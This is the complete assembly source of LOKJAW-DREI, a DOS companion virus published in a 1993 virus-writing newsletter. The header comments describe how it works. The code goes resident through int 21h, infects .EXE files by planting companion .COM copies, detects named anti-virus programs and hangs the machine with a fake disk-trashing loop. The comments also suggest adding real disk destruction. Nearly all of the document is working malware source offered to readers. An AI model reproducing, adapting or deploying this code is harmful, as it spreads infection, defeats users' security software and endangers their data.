;LOKJAW-DREI: an .EXE-infecting spawning virus with retaliatory 
;anti-anti-virus capability.  For Crypt Newsletter 12, Feb. 1993.               
;
;LOKJAW-DREI is a resident spawning virus which installs itself in
;memory using the same engine as the original Civil War/Proto-T virus.
;It is simpler in that none of its addresses have to be 
;relative, an indirect benefit of the fact that the virus has no 
;"appending" quality.  That means, LOKJAW doesn't alter its "host" files,
;just like a number of other companion/spawning viruses published in
;previous newsletters.
;
;LOKJAW hooks interrupt 21 and infects .EXE files on execution, creating 
;itself as companion .COMfile to the "host."  Due to the inherent rules
;of DOS, this ensures the virus will be executed before the "host" the
;next time the infected program is used.  In reality, LOKJAW is even
;simpler than that.  If not in memory, the first time the host is
;called, LOKJAW will go resident and not even bother to load it.
;In most cases, the user will assume a slight error and call the host
;again, at which point it will function normally. LOKJAW will then infect
;every subsequent .EXE file called. LOKJAW is very transparent in operation,
;except when certain anti-virus programs (Integrity Master, McAfee's SCAN &
;CLEAN, F-PROT & VIRSTOP and Central Point Anti-virus) are loaded.
;
;LOKJAW's "stinger" code demonstrates the simplicity of creating a strongly
;retaliating virus by quickly deleting the anti-virus program before it
;can execute and then displaying a "chomping" graphic.  Even if the anti-
;virus program cannot detect LOKJAW in memory, it will be deleted.  This
;makes it essential that the user know how to either remove the virus from
;memory before beginning anti-virus measures, or at the least run the
;anti-virus component from a write-protected disk. At a time when retail
;anti-virus packages are becoming more complicated - and more likely that the
;average user will run them from default installations on his hard file -
;LOKJAW's retaliating power makes it a potentially very annoying pest.
;A virus-programmer serious about inconveniencing a system could do a
;number of things with this basic idea. They are;
; 1. Remove the "chomp" effect. It is entertaining, but it exposes the virus
; instantly.
; 2. Alter the_stinger routine, so that the virus immediately attacks the
; hard file.  The implementation is demonstrated by LOKJAW-DREI, which
; merely makes the disk inaccessible until a warm reboot if an anti-virus
; program is employed against it.  By placing
; a BONA FIDE disk-trashing routine here, it becomes very hazardous for
; an unknowing user to employ anti-virus measures on a machine where
; LOKJAW or a LOKJAW-like program is memory resident. While LOCKAW and
; LOKJAW-ZWEI will produce write-protect errors if an anti-virus program
; is run against them from a write-protected diskette, LOKJAW-DREI
; won't.  It will recognize the anti-virus program, display the "chomp"
; and mimic trashing the hard file. This effect makes the disk inacessible
; until the machine is rebooted.
;
;The anti-anti-virus strategies are becoming more common in viral programming.                 
;Mark Ludwig programmed the features of a direct-action retaliating
;virus in his "Computer Virus Developments Quarterly."  Peach, Groove and
;Encroacher viruses attack anti-virus software by deletion of key files. 
;And in this issue, the Sandra virus employs a number 
;of anti-anti-virus features. 
;
;The LOKJAW source listings are TASM compatible. To remove LOKJAW-ZWEI and                
;DREI infected files from a system, simply delete the "companion" .COM 
;duplicates of your executables.  Ensure that the machine has been booted
;from a clean disk.  To remove the LOKJAW .COM-appending virus, at this
;time it will be necessary for you to restore the contaminated files from
;a clean back-up.
;
;Alert readers will notice the LOKJAW-ZWEI and DREI create their "companion"
;files in plain sight.  Generally, spawning viruses make themselves
;hidden-read-only-system files.  This is an easy hack and the code is supplied
;in earlier issues of the newsletter.  The modification is left to 
;the reader as an academic exercise.

		
		.radix 16
     cseg       segment
		model  small
		assume cs:cseg, ds:cseg, es:cseg

		org 100h

oi21            equ endit
filelength      equ endit - begin
nameptr         equ endit+4
DTA             equ endit+8

	 




begin:          jmp     virus_install                              

note:            
		db     '[lôákıÑW-d‚êç].·ù.ör„$≈ÜdâMñ$'
		db     '≈Hã$.p‚ôG‚Üm.å$.Ö.{p‚ô≈î-≈].˚É‚ãÜ§≈,$ì‚≈.îü.'
		db     'Ä‚òû.•âw$¿‰◊Ó‚'  ;I.D. note: will doubtless
					 ;show up in VSUM
		

						 ;install
virus_install:  mov     ax,cs                    ; reduce memory size     
		dec     ax                           
		mov     ds,ax                        
		cmp     byte ptr ds:[0000],5a        
		jne     cancel                        
		mov     ax,ds:[0003]                 
		sub     ax,100                        
		mov     ds:0003,ax
Zopy_virus:  
		mov     bx,ax                    ; copy to claimed block  
		mov     ax,es                        
		add     ax,bx                       
		mov     es,ax
		mov     cx,offset endit - begin                    
		mov     ax,ds                       
		inc     ax
		mov     ds,ax
		lea     si,ds:[begin]            
		lea     di,es:0100                  
		rep     movsb                       
						    


Grab_21:                                     
		
		mov     ds,cx                   ; hook int 21h
		mov     si,0084h                ; 
		mov     di,offset oi21
		mov     dx,offset check_exec
		lodsw
		cmp     ax,dx                   ;
		je      cancel                  ; exit, if already installed
		stosw
		movsw
		
		push    es 
		pop     ds
		mov     ax,2521h                ; revector int 21h to virus
		int     21h
				     
cancel:         ret          

check_exec:     
		pushf

		push    es                     ; push everything onto the
		push    ds                     ; stack
		push    ax
		push    bx
		push    dx

		cmp     ax,04B00h               ; is the file being 
		
		
		
		jne     abort                   ; executed?
		
		


					     ;if yes, try the_stinger
do_infect:      call    infect                  ; then try to infect
		
		
			      

abort:                                        ; restore everything
		pop     dx
		pop     bx
		pop     ax
		pop     ds
		pop     es
		popf

Bye_Bye:      
				   ; exit
		jmp     dword ptr cs:[oi21]                     


new_24h:        
		mov     al,3             ; critical error handler
		iret

infect:          
		mov     cs:[name_seg],ds       ; here, the virus essentially
		mov     cs:[name_off],dx       ; copies the name of the
		
		cld                            ; loaded file into a buffer
		mov     di,dx                  ; so that it can be compared
		push    ds                     ; against the default names
		pop     es                     ; in the_stinger
		mov     al,'.'                 ; subroutine 
		repne   scasb                  ; <-- 
		
		call    the_stinger            ; check for anti-virus load
					       ; and deploy the_stinger
		
		
		
		cld
		mov     word ptr cs:[nameptr],dx
		mov     word ptr cs:[nameptr+2],ds

		mov     ah,2Fh
		int     21h
		push    es
		push    bx

		push    cs

		pop     ds
		mov     dx,offset DTA
		mov     ah,1Ah
		int     21h

		call    searchpoint
		push    di
		mov     si,offset COM_txt

		mov     cx,3
	 rep    cmpsb 
		pop     di
		jz      do_com
		mov     si,offset EXE_txt
		nop
		mov     cl,3
		rep     cmpsb
		jnz     return

do_exe:         mov     si,offset COM_txt
		nop
		call    change_ext
		mov     ax,3300h
		nop
		int     21h
		push    dx

		cwd
		inc     ax
		push    ax
		int     21h

Grab24h:        
		
		mov     ax,3524h         
		int     21h        
		push    bx
		push    es
		push    cs
		pop     ds
		mov     dx,offset new_24h
		mov     ah,25h
		push    ax
		int     21h
		
		
		lds     dx,dword ptr [nameptr]  ;create the virus (unique name)
		xor     cx,cx
		mov     ah,05Bh
		int     21
		jc      return1                 
		xchg    bx,ax                   ;save handle
		


		push    cs
		pop     ds
		mov     cx,filelength          ;cx= length of virus
		mov     dx,offset begin        ;where to start copying
		mov     ah,40h                 ;write the virus to the 
		int     21h                    ;new file

		mov     ah,3Eh                 ; close
		int     21h

return1:        pop     ax
		pop     ds
		pop     dx
		int     21h
		
		pop     ax
		pop     dx
		int     21h
		
		mov     si,offset EXE_txt
		call    change_ext
		
return:         mov     ah,1Ah
		pop     dx
		pop     ds
		int      21H

		ret

do_com:         call    findfirst                 
		cmp     word ptr cs:[DTA+1Ah],endit - begin
		jne     return
		mov     si,offset EXE_txt
		call    change_ext
		call    findfirst
		jnc     return
		mov     si,offset COM_txt
		call    change_ext
		jmp     short return

searchpoint:    les     di,dword ptr cs:[nameptr]
		mov     ch,0FFh
		mov     al,0
	 repnz  scasb
		sub     di,4
		ret
change_ext:     call    searchpoint
		push    cs
		pop     ds
		movsw
		movsw
		ret

findfirst:      lds     dx,dword ptr [nameptr]
		mov     cl,27h
		mov     ah,4Eh
		int     21h
		ret
			 
the_stinger:
		cmp     word ptr es:[di-3],'MI'    ;Integrity Master
		je      jumptoass                
		
		cmp     word ptr es:[di-3],'XR'    ;VIRX
		je      jumptoass                
		
		cmp     word ptr es:[di-3],'PO'    ;VIRUSTOP
		jne     next1                     
		cmp     word ptr es:[di-5],'TS'   
		je      jumptoass                

next1:          cmp     word ptr es:[di-3],'VA'    ;AV = CPAV
		je      jumptoass                     
		
		cmp     word ptr es:[di-3],'TO'    ;*prot = F-prot
		jne     next2                
		cmp     word ptr es:[di-5],'RP'  
		je      jumptoass                     

next2:          cmp     word ptr es:[di-3],'NA'    ;*scan = McAfee's Scan.
		jne     next3                
		cmp     word ptr es:[di-5],'CS'  
		je      jumptoass                     
		
		cmp     word ptr es:[di-3],'NA'    ;*lean = McAfee's CLEAN.
		jne     next3                      ; why not, eh?
		cmp     word ptr es:[di-5],'EL'  
		je      jumptoass                     
next3:          ret                
jumptoass:      jmp     chomp                   ;assassination (deletion)
						; of anti-virus program
chomp:
		push    cs                           ; chomper visual
		pop     ds
		mov     ah, 03h
		int     10h
		mov     [c1], bh                   ; save cursor 
		mov     [c2], dh 
		mov     [c3], dl 
		mov     [c4], ch 
		mov     [c5], cl 
		mov     ah, 1
		mov     cl, 0
		mov     ch, 40h                 
		int     10h                    
					       
		mov     cl, 0
		mov     dl, 4Fh                 
		mov     ah, 6
		mov     al, 0
		mov     bh, 0Fh
		mov     ch, 0
		mov     cl, 0
		mov     dh, 0
		mov     dl, 4Fh                 
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 0
		mov     dl, 1Fh
		mov     bh, 0
		int     10h                    
					       
		mov     dx,offset eyes           ; print the eyes
		mov     ah, 9
		mov     bl, 0Fh
		int     21h                    
					       
		mov     ah, 2
		mov     dh, 1
		mov     dl, 0
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0DCh
		mov     bl, 0Fh
		mov     cx, 50h
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 18h
		mov     dl, 0
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0DFh
		mov     bl, 0Fh
		mov     cx, 50h
		int     10h                    
					       
		mov     dl, 0
chomp_1:
		mov     ah, 2
		mov     dh, 2
		int     10h                    
					       
		mov     ah, 9
		mov     al, 55h                 
		mov     bl, 0Fh
		mov     cx, 1
		int     10h                    
					       
		mov     ah, 2
		mov     dh, 17h
		inc     dl
		int     10h                    
					       
		mov     ah, 9
		mov     al, 0EFh
		mov     bl, 0Fh
		int     10h                    
					       
		inc     dl
		cmp     dl, 50h                 
		jl      chomp_1                  
		mov     [data_1], 0
chomp_3:
		mov     cx, 7FFFh                    ; delays

locloop_4:
		loop    locloop_4              

		inc     [data_1]
		cmp     [data_1], 0Ah
		jl      chomp_3                  
		mov     [data_1], 0
		mov     cl, 0
		mov     dl, 4Fh                 
chomp_5:
		mov     ah, 6
		mov     al, 1
		mov     bh, [data_2]
		mov     ch, 0Dh
		mov     dh, 18h
		int     10h                    
					       
		mov     ah, 7
		mov     al, 1
		mov     bh, [data_2]
		mov     ch, 0
		mov     dh, 0Ch
		int     10h                    
		mov     cx, 3FFFh                      ; delays

locloop_6:
		loop    locloop_6              
		inc     [data_1]
		cmp     [data_1], 0Bh
		jl      chomp_5                  
		mov     [data_1], 0
chomp_7:
		mov     cx, 7FFFh                       ; delays

locloop_8:
		loop    locloop_8              
		inc     [data_1]
		cmp     [data_1], 0Ah
		jl      chomp_7                  
		mov     ah, 6
		mov     al, 0
		mov     bh, [data_2]
		mov     ch, 0
		mov     cl, 0
		mov     dh, 18h
		mov     dl, 4Fh                 
		int     10h                    
					       
		mov     cl, 7
		mov     ch, 6
		int     10h                    
		
		mov     ah, 2
		mov     bh, [c1] 
		mov     dh, [c2] 
		mov     dl, [c3] 
		int     10h
		mov     al, bh
		mov     ah, 5
		int     10h
		mov     ah, 1
		mov     ch, [c4]
		mov     cl, [c5]
		int     10h
		mov     ax, 0003h
		int     10h                        ; sort of a cls
		mov     ax, 00ffh
		
		mov     si,0              ;scarey part: drive reads real
scarey:         lodsb                     ;fast ala Michelangelo-style
		mov     ah,al             ;over-write, but this routine only
		lodsb                     ;gets random bytes here for a 
		and     al,3              ;cylinder to READ
		mov     dl,80h
		mov     dh,al
		mov     ch,ah
		mov     cl,1
		mov     bx,offset last    ;buffer to read into
		mov     ax,201h
		int     13h      ;jump into a loop, effectively hang machine
		jmp     short scarey      ;yow! scarey! just think if this
					  ;was made by someone not as nice as
					  ;me. 
					  ;It's not much of a stretch to
					  ;imagine a routine for thumping
					  ;the hard file in place of scarey.
					  ;A retaliating virus of this
					  ;nature is a distinct 
					  ;possibility.

EXE_txt         db  'EXE',0
COM_txt         db  'COM',0

eyes            db      '(o)          (o)','$'  ; ASCII eyes of Lockjaw    

data_1          db      0
data_2          db      0

last            db     090H
name_seg        dw  ?
name_off        dw  ?

c1              db       0          
c2              db       0          
c3              db       0          
c4              db       0          
c5              db       0          
note2:          db      'Lokjaw-Drei'
			   
endit:


cseg            ends
		end begin



